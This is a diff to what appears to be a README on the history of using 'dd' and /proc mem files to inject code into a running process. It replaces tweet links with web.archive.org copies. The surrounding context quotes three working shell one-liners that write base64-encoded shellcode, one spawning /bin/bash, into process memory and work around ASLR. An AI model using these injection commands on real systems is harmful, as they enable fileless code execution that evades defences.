@@ -58,7 +58,7 @@ This technique has a slightly complicated history, with some "multiple discovery
 
 Before ASLR/PIE was widely implemented, somebod{y,ies} realised that the `dd` binary could be used to inject code into its own address space, by writing to `/proc/self/mem`, making use of the `seek` argument to seek to the correct offset within the `mem` file to point into some executable code, which would subsequently be executed.
 
-An example of this can be seen in brainsmoke's [tweet](https://twitter.com/brainsmoke/status/399558997994668033) here:
+An example of this can be seen in brainsmoke's [tweet](https://web.archive.org/web/20220907035407/https://twitter.com/brainsmoke/status/399558997994668033) here:
 
 ```sh
 base64 -d<<<aExPTApUXmoEagFqAl9YWg8F|dd seek=1 bs=$((`objdump -d /*/dd|grep ll.*\<w|sed 's/\([0-9a-f]\+\):.*/0x\1+5/'`)) of=/proc/self/mem
@@ -68,7 +68,7 @@ base64 -d<<<aExPTApUXmoEagFqAl9YWg8F|dd seek=1 bs=$((`objdump -d /*/dd|grep ll.*
 
 To account for PIE, `brainsmoke` came up with the idea of injecting into the shell process, as opposed to `dd` itself. Since the shell process stays running for the duration, we can dynamically "leak" pointers from various `/proc/<pid>/*` entries, and use that to know where to inject the code, thus "bypassing" ASLR. `dd` does not have permission to open the parent shell's `mem` file, and so clever fd redirection was used to get the shell itself to open the fd, to be passed into `dd`.
 
-Example ([source](https://twitter.com/brainsmoke/status/1258875830014480386))
+Example ([source](https://web.archive.org/web/20220904095110/https://twitter.com/brainsmoke/status/1258875830014480386))
 
 ```sh
 cd /proc/$$;exec 3>mem;(base64 -d<<<MdtoL2JpbkiJ54FvBNGMl/9qLcZH+WNIieBTSIni6w5QSI1ADVBIieaNQzsPBejt////L2Jpbi9iYXNoAADrwA==;yes $'\xeb\xfc'|tr -d '\n')|dd bs=1 seek=$((0x$(grep vdso -m1 maps|cut -f1 -d-)))>&3
@@ -80,7 +80,7 @@ Independently, `arget13` had the idea of using `dd` to do something similar to t
 
 ### Parallel idea 3:
 
-I was vaguely aware of `brainsmoke`'s technique, having seen it mentioned on IRC several years prior. However, I couldn't remember how it worked exactly, and so I tried to reinvent it myself. I came up with [this](https://twitter.com/David3141593/status/1386438123647868930)
+I was vaguely aware of `brainsmoke`'s technique, having seen it mentioned on IRC several years prior. However, I couldn't remember how it worked exactly, and so I tried to reinvent it myself. I came up with [this](https://web.archive.org/web/20220811155804/https://twitter.com/David3141593/status/1386438123647868930)
 
 ```sh
 dd of=/proc/$$/mem bs=1 seek=$(($(cut -d" " -f9</proc/$$/syscall))) if=<(base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F) conv=notrunc
